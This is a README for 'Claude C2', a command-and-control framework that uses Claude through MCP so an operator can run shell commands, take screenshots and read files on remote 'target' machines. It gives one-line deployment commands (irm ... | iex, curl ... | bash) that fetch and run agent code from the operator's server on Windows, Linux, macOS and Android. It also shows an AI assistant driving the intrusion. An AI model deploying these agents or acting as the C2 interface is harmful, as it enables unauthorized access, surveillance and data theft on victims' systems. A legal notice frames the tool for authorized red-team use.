<div align="center">

<img src="https://raw.githubusercontent.com/0xyg3n/claude-c2/main/docs/logo.svg" alt="Claude C2" width="120">

# Claude C2

### AI-Powered Command & Control Framework

[![Platform](https://img.shields.io/badge/Windows%20%7C%20Linux%20%7C%20macOS%20%7C%20Android-blue?style=for-the-badge)](https://github.com/0xyg3n/claude-c2)
[![MCP](https://img.shields.io/badge/Claude-MCP-7C3AED?style=for-the-badge)](https://claude.ai)
[![Node](https://img.shields.io/badge/Node.js-18+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org)

<br>

<img src="https://raw.githubusercontent.com/0xyg3n/claude-c2/main/docs/demo.gif" alt="Demo" width="700">

<br>

**Natural language control of remote systems through Claude AI and Model Context Protocol**

<br>

[Overview](#overview) · [Architecture](#architecture) · [Installation](#installation) · [Deployment](#deployment) · [Documentation](#documentation)

</div>

<br>

---

<br>

## Overview

Claude C2 is a command and control framework that integrates with Anthropic's Model Context Protocol (MCP), enabling operators to manage remote systems through natural language conversations with Claude AI.

Rather than memorizing command syntax across different operating systems, operators communicate intent in plain English. The AI interprets requests, selects appropriate targets, executes the necessary commands, and returns formatted results.

```
Operator:  "Show me all connected systems"
Claude:    [Queries client manager, returns formatted list with OS, hostname, IP, user context]

Operator:  "Capture the screen on the Windows workstation"
Claude:    [Identifies target, executes screenshot, saves to server, confirms completion]

Operator:  "List files in the user's Documents folder"
Claude:    [Runs directory listing on target, returns formatted file list]
```

<br>

### Key Characteristics

| Feature | Description |
|:--------|:------------|
| **Natural Language Interface** | Communicate with targets through conversational English |
| **Cross-Platform** | Unified control across Windows, Linux, macOS, and Android |
| **Adaptive Execution** | AI automatically translates intent to OS-specific commands |
| **Minimal Footprint** | Agents use native scripting tools with no additional binaries |
| **Encrypted Transport** | TLS-secured WebSocket connections with secure authentication |
| **Claude.ai + Claude Code** | Works with both web interface and CLI (API key auth) |
| **Auto-Recovery** | Agents automatically reconnect on connection loss |
| **Brute-Force Protection** | Rate limiting with exponential backoff lockouts |

<br>

---

<br>

## Architecture

```
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                            │
│                           CLAUDE C2 ARCHITECTURE                           │
│                                                                            │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│    ┌──────────────┐         ┌──────────────┐         ┌──────────────┐     │
│    │              │         │              │         │              │     │
│    │   OPERATOR   │   MCP   │   COMMAND    │   WSS   │    TARGET    │     │
│    │              │◄───────►│              │◄───────►│              │     │
│    │  Claude.ai   │   SSE   │    SERVER    │  JSON   │    AGENTS    │     │
│    │  Claude Code │         │              │         │              │     │
│    └──────────────┘         └──────────────┘         └──────────────┘     │
│                                                                            │
│         │                         │                         │             │
│         │  Natural language       │  Command routing        │  Shell      │
│         │  requests/responses     │  Client management      │  execution  │
│         │  via Claude AI          │  OAuth + TLS            │  Results    │
│         │                         │                         │             │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

<br>

### Command Execution Flow

The following diagram illustrates the complete lifecycle of a command from operator request to agent execution:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ STEP 1: OPERATOR REQUEST                                                    │
│                                                                             │
│ User (Claude.ai/Code):  "Execute 'whoami' on LAPTOP01"                     │
│ Claude AI translates natural language to MCP tool call                     │
└───────────────────────────────────┬─────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ STEP 2: MCP REQUEST (JSON-RPC 2.0)                                          │
│                                                                             │
│ POST /mcp/sse                                                               │
│ Header: X-API-Key: [api-key]                                               │
│                                                                             │
│ {                                                                           │
│   "jsonrpc": "2.0",                                                         │
│   "method": "tools/call",                                                   │
│   "params": { "name": "shell", "arguments": { "cmd": "whoami" } }          │
│ }                                                                           │
└───────────────────────────────────┬─────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ STEP 3: AUTHENTICATION (SecureAuthManager)                                  │
│                                                                             │
│ ├─ Extract client IP address                                               │
│ ├─ Check lockout status (exponential backoff)                              │
│ ├─ Hash API key: SHA-256(apiKey)                                           │
│ ├─ Timing-safe compare with stored hash                                    │
│ └─ On success: proceed | On failure: 401/423 + rate limit                 │
└───────────────────────────────────┬─────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ STEP 4: TOOL HANDLER (ClientManager)                                        │
│                                                                             │
│ ├─ Parse tool name: "shell"                                                │
│ ├─ Smart client selection:                                                 │
│ │   ├─ If client_id provided → use specified client                       │
│ │   ├─ If 1 client connected → auto-select                                │
│ │   └─ If 0 or multiple → error                                           │
│ ├─ Generate command UUID                                                   │
│ └─ Queue command with timeout (default 30s)                               │
└───────────────────────────────────┬─────────────────────────────────────────┘
                                    │
                                    │ WebSocket (WSS)
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ STEP 5: COMMAND DISPATCH                                                    │
│                                                                             │
│ Server sends to agent via WebSocket:                                       │
│ {                                                                           │
│   "type": "command",                                                        │
│   "commandId": "550e8400-e29b-41d4-a716-446655440000",                     │
│   "command": "shell",                                                       │
│   "args": { "cmd": "whoami" },                                             │
│   "timestamp": "2025-12-05T10:30:00Z"                                      │
│ }                                                                           │
└───────────────────────────────────┬─────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ STEP 6: AGENT EXECUTION                                                     │
│                                                                             │
│ Platform-specific execution:                                               │
│                                                                             │
│ Windows (PowerShell):  $output = iex $msg.args.cmd                         │
│ Linux (Bash/Python):   output = subprocess.run(cmd, shell=True)            │
│ macOS (Bash):          output=$(eval "$cmd")                               │
│                                                                             │
│ Captures: stdout, stderr, exit code                                       │
└───────────────────────────────────┬─────────────────────────────────────────┘
                                    │
                                    │ WebSocket (WSS)
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ STEP 7: RESPONSE                                                            │
│                                                                             │
│ Agent sends result:                                                        │
│ {                                                                           │
│   "type": "command_response",                                               │
│   "commandId": "550e8400-e29b-41d4-a716-446655440000",                     │
│   "result": { "success": true, "stdout": "admin", "exitCode": 0 }          │
│ }                                                                           │
│                                                                             │
│ Server resolves pending Promise, logs to history                           │
└───────────────────────────────────┬─────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ STEP 8: MCP RESPONSE                                                        │
│                                                                             │
│ Sent via SSE stream:                                                       │
│ event: message                                                              │
│ data: {"jsonrpc":"2.0","result":{"content":[{"type":"text",...}]}}        │
│                                                                             │
│ Claude formats for operator: "Command executed. Output: admin"             │
└─────────────────────────────────────────────────────────────────────────────┘
```

<br>

### Core Components

| Component | Location | Responsibility |
|:----------|:---------|:---------------|
| **SecureAuthManager** | `src/server.js:30-210` | API key validation, rate limiting, brute-force protection |
| **ClientManager** | `src/server.js:264-326` | Agent registration, command routing, response handling |
| **MCP Handler** | `src/server.js:457-1876` | 36 tool definitions, tool execution, JSON-RPC processing |
| **WebSocket Server** | `src/server.js:2111-2174` | Persistent agent connections, heartbeat, message routing |

<br>

### Protocol Details

| Layer | Protocol | Details |
|:------|:---------|:--------|
| **Operator ↔ Server** | MCP over SSE | JSON-RPC 2.0, HTTPS, API Key or OAuth 2.0 |
| **Server ↔ Agent** | WebSocket | WSS (TLS), JSON messages, 15s heartbeat |
| **Authentication** | SHA-256 | Timing-safe comparison, hash-only storage |
| **Binary Data** | Base64 | Screenshots and files encoded for JSON transport |

<br>

### Message Types

**MCP (Operator ↔ Server):**

| Method | Description |
|:-------|:------------|
| `initialize` | Protocol handshake, capability negotiation |
| `tools/list` | Return available tool definitions |
| `tools/call` | Execute a tool with arguments |

**WebSocket (Server ↔ Agent):**

| Type | Direction | Purpose |
|:-----|:----------|:--------|
| `register` | Agent → Server | Initial connection with system info |
| `registered` | Server → Agent | Registration confirmation |
| `ping` / `pong` | Bidirectional | Heartbeat (15s interval) |
| `command` | Server → Agent | Execute command request |
| `command_response` | Agent → Server | Command result with stdout/stderr |

<br>

### Timeout Configuration

| Command Type | Timeout | Reason |
|:-------------|:--------|:-------|
| Shell commands | 30s | Standard execution |
| Screenshots | 60s | Screen capture + base64 encoding |
| File operations | 30s | Standard I/O |

<br>

**For comprehensive technical documentation, see [Command Flow Documentation](docs/COMMAND-FLOW.md).**

<br>

---

<br>

## Installation

### Prerequisites

- Node.js 18 or higher
- Valid SSL certificate (Let's Encrypt recommended)
- Domain name pointing to server
- Network access on ports 443, 3101, 3102

### Server Setup

```bash
# Clone repository
git clone https://github.com/0xyg3n/claude-c2.git
cd claude-c2

# Install dependencies
npm install

# Configure environment
cp .env.example .env
```

Edit `.env` with your configuration:

```env
DOMAIN=your-domain.com
MCP_PORT=3101
WS_PORT=3102
OAUTH_CLIENT_ID=your-client-id
OAUTH_CLIENT_SECRET=your-client-secret
SSL_CERT_PATH=/path/to/cert.pem
SSL_KEY_PATH=/path/to/key.pem
```

```bash
# Start server
npm start
```

### Claude.ai Integration (Web)

Configure MCP connector in Claude.ai settings:

| Parameter | Value |
|:----------|:------|
| Server URL | `https://your-domain.com/mcp/sse` |
| Authentication | OAuth 2.0 |
| Client ID | Value from `.env` |
| Client Secret | Value from `.env` |

<br>

### Claude Code Integration (CLI) - Recommended

Claude Code CLI supports API key authentication, which is simpler and more reliable than OAuth for remote servers.

**Step 1: Generate API Key**

```bash
node -e "const{randomBytes,createHash}=require('crypto');const k=randomBytes(32).toString('base64url');console.log('API_KEY='+k);console.log('API_KEY_HASH='+createHash('sha256').update(k).digest('hex'))"
```

Save the `API_KEY` securely - you'll need it for client configuration.
Add `API_KEY_HASH` to your `.env` file (never store the plaintext key on server).

**Step 2: Restart Server**

```bash
# Restart to load new config
pkill -f "node src/server.js"
node src/server.js
```

**Step 3: Configure Claude Code**

Add to `~/.claude/settings.json`:

```json
{
  "mcpServers": {
    "claude-c2": {
      "type": "sse",
      "url": "https://your-domain.com/mcp/sse",
      "headers": {
        "X-API-Key": "YOUR_API_KEY_HERE"
      }
    }
  }
}
```

**Step 4: Verify Connection**

```bash
claude  # Start Claude Code
/mcp    # Check MCP servers - should show "connected"
```

<br>

### Security Features

| Feature | Description |
|:--------|:------------|
| **256-bit API Keys** | Cryptographically secure (base64url encoded) |
| **Hash-Only Storage** | Server stores SHA-256 hash, never plaintext |
| **Timing-Safe Comparison** | Prevents timing attacks |
| **Rate Limiting** | 5 attempts per minute per IP |
| **Exponential Backoff** | 30s → 60s → 2m → 4m → ... → 30m max lockout |
| **Audit Logging** | All auth attempts logged to `logs/security.log` |

<br>

---

<br>

## Deployment

Deploy agents to target systems using platform-specific one-liners:

<table>
<thead>
<tr>
<th align="center">Platform</th>
<th>Deployment Command</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center"><b>Windows</b></td>
<td>

```powershell
irm https://YOUR_DOMAIN/agent/windows | iex
```

</td>
</tr>
<tr>
<td align="center"><b>Linux</b></td>
<td>

```bash
curl -s https://YOUR_DOMAIN/agent/linux | bash
```

</td>
</tr>
<tr>
<td align="center"><b>macOS</b></td>
<td>

```bash
curl -s https://YOUR_DOMAIN/agent/macos | bash
```

</td>
</tr>
<tr>
<td align="center"><b>Android</b></td>
<td>

```bash
curl -s https://YOUR_DOMAIN/agent/termux | bash
```

</td>
</tr>
</tbody>
</table>

Agents operate in memory without persistence by default. Connection resilience is built-in with automatic reconnection on network interruption.

<br>

---

<br>

## Usage Examples

| Request | Action |
|:--------|:-------|
| `"List all connected clients"` | Display all active agents with system information |
| `"Execute whoami on target"` | Run shell command and return output |
| `"Take a screenshot"` | Capture display (Windows) |
| `"List files in Documents"` | List directory contents |
| `"Read config.txt"` | Read file contents from target system |

When a single agent is connected, Claude automatically selects it. With multiple agents, specify the target by name or identifier.

<br>

---

<br>

## Demonstrated Platforms

<div align="center">

| Windows 11 | Android (Termux) |
|:----------:|:----------------:|
| <img src="https://raw.githubusercontent.com/0xyg3n/claude-c2/main/docs/poc-windows.png" width="320"> | <img src="https://raw.githubusercontent.com/0xyg3n/claude-c2/main/docs/poc-termux.png" width="320"> |
| Full agent functionality | Termux environment with API access |

</div>

<br>

---

<br>

## Documentation

| Document | Description |
|:---------|:------------|
| [Command Flow](docs/COMMAND-FLOW.md) | Complete technical documentation of command execution pipeline |
| [Integration Guide](docs/INTEGRATIONS.md) | Claude.ai configuration and API setup |
| [Android Operations](docs/ANDROID-TERMUX.md) | Termux-specific features and Termux:API |

<br>

---

<br>

## Legal Notice

<table>
<tr>
<td>

**This software is provided strictly for authorized security testing, educational research, and legitimate penetration testing engagements.**

By using this software, you acknowledge and agree to the following:

- You have obtained **explicit written authorization** for any systems tested
- You understand that unauthorized access to computer systems is a **criminal offense** under applicable laws including but not limited to the Computer Fraud and Abuse Act (CFAA), Computer Misuse Act, and equivalent legislation in your jurisdiction
- The authors and contributors accept **no responsibility or liability** for any misuse, damage, or illegal activities conducted with this software
- You assume **full legal responsibility** for your use of this software

This tool is intended exclusively for:
- Licensed penetration testers with valid authorization
- Red team operators with written scope agreements
- Security researchers in controlled environments
- Educational purposes in authorized lab settings

</td>
</tr>
</table>

<br>

---

<div align="center">

<sub>

**Claude C2** — Built on Anthropic's Model Context Protocol

</sub>

</div>
